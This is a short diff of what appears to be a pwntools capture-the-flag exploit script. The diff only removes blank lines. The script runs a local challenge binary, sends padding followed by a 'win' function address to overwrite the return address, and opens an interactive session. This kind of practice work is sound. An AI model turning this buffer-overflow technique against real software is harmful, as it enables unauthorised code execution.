@@ -1,4 +1,3 @@
-
 from pwn import *
 
 r = process("/challenge/babystack_level2")
@@ -23,4 +22,3 @@ payload = b'a'*padding + p64(win_addr)
 r.sendline(payload)
 
 r.interactive()
-
